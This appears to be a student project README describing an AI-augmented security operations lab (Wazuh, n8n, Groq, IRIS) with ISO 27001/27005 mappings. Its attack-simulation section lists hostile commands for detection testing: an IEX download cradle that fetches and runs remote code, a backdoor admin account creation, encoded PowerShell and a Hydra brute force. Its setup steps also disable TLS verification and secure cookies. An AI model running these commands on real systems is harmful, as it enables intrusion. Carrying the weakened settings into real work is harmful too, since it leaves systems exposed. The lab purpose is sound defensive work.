# 🛡️ AI-Augmented SOC Lab — PFA M2

> Design and Implementation of an AI-Augmented Security Operations Center aligned with ISO 27001 & ISO 27005

![Wazuh](https://img.shields.io/badge/SIEM-Wazuh-blue)
![n8n](https://img.shields.io/badge/SOAR-n8n-orange)
![IRIS](https://img.shields.io/badge/IRP-IRIS-purple)
![Groq](https://img.shields.io/badge/AI-Groq%20LLaMA3-green)
![ISO](https://img.shields.io/badge/Compliance-ISO%2027001%2F27005-red)

---

## 📋 Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Stack](#stack)
- [Network Topology](#network-topology)
- [Pipeline](#pipeline)
- [n8n Workflow](#n8n-workflow)
- [ISO 27001 / 27005 Mapping](#iso-27001--27005-mapping)
- [Installation](#installation)
- [Attack Simulations](#attack-simulations)
- [Screenshots](#screenshots)

---

## Overview

This project implements a fully functional **AI-Augmented SOC Lab** built entirely on open-source tools. It demonstrates real-world security operations including threat detection, AI-powered alert triage, automated incident response, and compliance with ISO 27001 and ISO 27005 standards.

### Key Features
- 🔍 **Real-time threat detection** via Wazuh SIEM + Sysmon (olafhartong config)
- 🤖 **AI-powered alert triage** using Groq (LLaMA 3.1-8b-instant)
- ⚡ **Automated incident response** via n8n SOAR
- 📋 **Automatic case creation** in IRIS IRP
- 🌐 **Threat intelligence enrichment** via AbuseIPDB & VirusTotal
- 📱 **Real-time Telegram notifications** for High/Critical alerts
- 📊 **ISO 27001/27005 compliance** evidence generation
- 🎯 **MITRE ATT&CK mapping** on every alert

---

## Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                        ATTACK ZONE                          │
│                    Kali Linux (Attacker)                    │
└─────────────────────────┬───────────────────────────────────┘
                          │ attacks
┌─────────────────────────▼───────────────────────────────────┐
│                      VICTIM ZONE                            │
│         Windows 10 + Sysmon (olafhartong config)            │
│                    Wazuh Agent (001)                        │
└─────────────────────────┬───────────────────────────────────┘
                          │ forwards logs
┌─────────────────────────▼───────────────────────────────────┐
│                       SOC ZONE                              │
│                                                             │
│  ┌─────────┐    ┌──────┐    ┌──────────┐    ┌──────────┐  │
│  │  Wazuh  │───▶│ n8n  │───▶│  Groq AI │───▶│   IRIS   │  │
│  │  SIEM   │    │ SOAR │    │ LLaMA3.1 │    │   IRP    │  │
│  └─────────┘    └──┬───┘    └──────────┘    └──────────┘  │
│   SOCFortress      │                              │        │
│      Rules         │   ┌─────────────┐           │        │
│                    ├──▶│  AbuseIPDB  │           │        │
│                    ├──▶│  VirusTotal │           ▼        │
│                    └──▶│  Telegram 📱│   High/Critical    │
│                        └─────────────┘                     │
└─────────────────────────────────────────────────────────────┘
```

---

## Stack

| Tool | Role | Version |
|------|------|---------|
| **Wazuh** | SIEM / XDR | 4.x OVA |
| **Sysmon** | Endpoint telemetry | olafhartong config |
| **SOCFortress Rules** | Detection rules | Latest |
| **n8n** | SOAR / Automation | 2.x (Docker) |
| **Groq API** | AI triage (LLaMA 3.1) | llama-3.1-8b-instant |
| **IRIS** | Incident Response Platform | 2.4.x (Docker) |
| **AbuseIPDB** | IP reputation | API v2 |
| **VirusTotal** | Hash scanning | API v3 |
| **Telegram Bot** | Alert notifications | Bot API |

---

## Network Topology

| VM | OS | NAT IP | Role |
|----|----|---------|------|
| Wazuh | OVA | `192.168.1.3` | SIEM Server |
| Windows 10 | Windows 10 | `192.168.1.5` | Victim Endpoint |
| Ubuntu (n8n + IRIS) | Ubuntu 22.04 | `192.168.1.4` | SOC Platform |
| Kali Linux | Kali | `192.168.1.x` | Attacker |

### Services

| Service | URL |
|---------|-----|
| Wazuh Dashboard | `https://192.168.1.3` |
| n8n | `http://192.168.1.4:5678` |
| IRIS | `https://192.168.1.4` |

---

## Pipeline

```
1. Windows 10 + Sysmon generates telemetry
        ↓
2. Wazuh agent (ID: 001) forwards logs to Wazuh SIEM
        ↓
3. SOCFortress rules analyze and assign severity level
        ↓
4. Wazuh integration POSTs alert to n8n webhook (level 5+)
        ↓
5. n8n Extract Indicators node normalizes alert:
   - Extracts src_ip, dst_ip, file_hash
   - Deduplication logic prevents alert flooding
        ↓
6. Parallel enrichment:
   ├── Has IP  → AbuseIPDB reputation check
   ├── Has Hash → VirusTotal scan
   └── Other   → pass through
        ↓
7. Groq AI (LLaMA 3.1) analyzes enriched alert:
   - Threat classification
   - Risk score (0-100)
   - MITRE ATT&CK mapping
   - Recommended actions
   - Executive summary
        ↓
8. IRIS case created automatically with full AI analysis
        ↓
9. IF level >= 10 → Telegram notification 📱
```

---

## n8n Workflow

The complete n8n workflow (`Wazuh-Optimal-Workflow`) consists of:

| Node | Type | Purpose |
|------|------|---------|
| Wazuh Webhook | Webhook | Receives Wazuh alerts |
| Extract Indicators | Code | Normalizes + deduplicates alerts |
| Has IP? | IF | Routes alerts with source IP |
| Has Hash? | IF | Routes alerts with file hash |
| AbuseIPDB | HTTP Request | IP reputation enrichment |
| VirusTotal | HTTP Request | Hash/file scanning |
| Converge to AI | No-Op | Merges all branches |
| AI Analysis via Groq | HTTP Request | LLM-powered triage |
| IRIS Case Creation | HTTP Request | Auto case management |
| IF level >= 10 | IF | Severity routing |
| Telegram | Telegram | Critical alert notification |

### Groq AI SOC Playbook Output Format

```
ALERT ID: [id]
THREAT CLASSIFICATION: [classification]
RISK SCORE: [0-100]
RISK LEVEL: [Low/Medium/High/Critical]
CONFIDENCE LEVEL: [Low/Medium/High]
MITRE ATT&CK MAPPING:
  Tactic: [tactic]
  Technique ID: [T####]
  Technique Name: [name]
ANALYSIS REASONING: [detailed reasoning]
RECOMMENDED ACTIONS: [tier 1 actions]
ESCALATION REQUIRED: [Yes/No]
EXECUTIVE SUMMARY: [2-3 sentences, business impact]
```

---

## ISO 27001 / 27005 Mapping

### ISO 27001 Annex A Controls

| Control | Description | Implementation |
|---------|-------------|----------------|
| A.5.24 | Incident response planning | n8n automated playbooks |
| A.5.25 | Assessment of security events | Groq AI risk scoring |
| A.5.26 | Response to incidents | IRIS automatic case creation |
| A.5.28 | Collection of evidence | Wazuh alert logs + IRIS cases |
| A.8.15 | Logging | Wazuh + Sysmon telemetry |
| A.8.16 | Monitoring activities | Wazuh real-time dashboard |
| A.8.20 | Network security | VirtualBox network segmentation |

### ISO 27005 Risk Management

| Phase | Implementation |
|-------|----------------|
| Risk identification | Wazuh + SOCFortress rules detect threats |
| Risk analysis | Groq AI calculates risk score (0-100) |
| Risk evaluation | Priority score + MITRE mapping per alert |
| Risk treatment | Automated: IRIS case + Telegram notification |

---

## Installation

### Prerequisites
- VirtualBox 7.x
- 16GB RAM minimum
- 100GB free disk space

### 1. Wazuh SIEM
```bash
# Download Wazuh OVA:
# https://documentation.wazuh.com/current/deployment-options/virtual-machine/virtual-machine.html
# Import into VirtualBox
# Default credentials: wazuh-user / wazuh
```

### 2. Windows 10 + Sysmon
```powershell
# Install Wazuh Agent from Wazuh dashboard → Agents → Deploy New Agent
NET START WazuhSvc

# Install Sysmon with olafhartong config
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "C:\Sysmon.zip"
Expand-Archive -Path "C:\Sysmon.zip" -DestinationPath "C:\Users\demo\Downloads\Sysmon"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/olafhartong/sysmon-modular/master/sysmonconfig.xml" -OutFile "C:\Users\demo\Downloads\Sysmon\sysmonconfig.xml"
C:\Users\demo\Downloads\Sysmon\Sysmon64.exe -accepteula -i C:\Users\demo\Downloads\Sysmon\sysmonconfig.xml
```

### 3. SOCFortress Rules
```bash
sudo su
curl -so ~/wazuh_socfortress_rules.sh \
  https://raw.githubusercontent.com/socfortress/Wazuh-Rules/main/wazuh_socfortress_rules.sh \
  && bash ~/wazuh_socfortress_rules.sh
```

### 4. n8n + IRIS (Ubuntu 22.04)
```bash
# Install Docker (official repo)
sudo apt update && sudo apt install -y ca-certificates curl gnupg
sudo install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
sudo chmod a+r /etc/apt/keyrings/docker.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \
  https://download.docker.com/linux/ubuntu $(. /etc/os-release && echo "$VERSION_CODENAME") stable" \
  | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt update
sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

# Run n8n
docker run -d \
  --name n8n \
  -p 5678:5678 \
  -e N8N_SECURE_COOKIE=false \
  -v n8n_data:/home/node/.n8n \
  --restart unless-stopped \
  n8nio/n8n

# Run IRIS
git clone https://github.com/dfir-iris/iris-web.git
cd iris-web && cp .env.model .env
nano .env  # Set IRIS_ADM_PASSWORD
docker compose up -d
```

### 5. Wazuh Integration
```xml
<!-- /var/ossec/etc/ossec.conf -->
<integration>
  <name>shuffle</name>
  <hook_url>http://192.168.1.4:5678/webhook/wazuh</hook_url>
  <level>5</level>
  <alert_format>json</alert_format>
  <agent_id>001</agent_id>
</integration>
```

```bash
# Fix SSL verification
sudo nano /var/ossec/integrations/shuffle.py
# Change timeout=10 to timeout=10, verify=False
sudo systemctl restart wazuh-manager
```

---

## Attack Simulations

### 1. Mimikatz Detection
```powershell
echo "" > C:\mimikatz.exe
# Expected: Level 10-15 | MITRE T1003 | Credential Dumping
```

### 2. Encoded PowerShell
```powershell
powershell -enc ZQBjAGgAbwAgAHQAZQBzAHQA
# Expected: Level 10 | MITRE T1059.001 | PowerShell
```

### 3. Suspicious User Creation
```powershell
net user hacker Password123 /add
net localgroup administrators hacker /add
# Expected: Level 8+ | MITRE T1136 | Create Account
```

### 4. Download Cradle
```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.4')"
# Expected: Level 10+ | MITRE T1059.001
```

### 5. Brute Force (from Kali)
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.1.5
# Expected: Level 10 | MITRE T1110 | Brute Force
```

---

## Screenshots

> 📸 To be added

- [ ] Wazuh Dashboard — active alerts
- [ ] n8n Workflow — full pipeline
- [ ] Groq AI — triage output
- [ ] IRIS — auto-created cases
- [ ] Telegram — alert notification
- [ ] AbuseIPDB enrichment
- [ ] VirusTotal hash scan

---

## References

- [Wazuh Documentation](https://documentation.wazuh.com)
- [IRIS Documentation](https://docs.dfir-iris.org)
- [n8n Documentation](https://docs.n8n.io)
- [SOCFortress Rules](https://github.com/socfortress/Wazuh-Rules)
- [Sysmon Modular — olafhartong](https://github.com/olafhartong/sysmon-modular)
- [ISO 27001](https://www.iso.org/standard/27001)
- [ISO 27005](https://www.iso.org/standard/27005)
- [MITRE ATT&CK](https://attack.mitre.org)
- [AbuseIPDB](https://abuseipdb.com)
- [VirusTotal](https://virustotal.com)

---

## Author

> M2 Cybersecurity Student — PFA 2025/2026
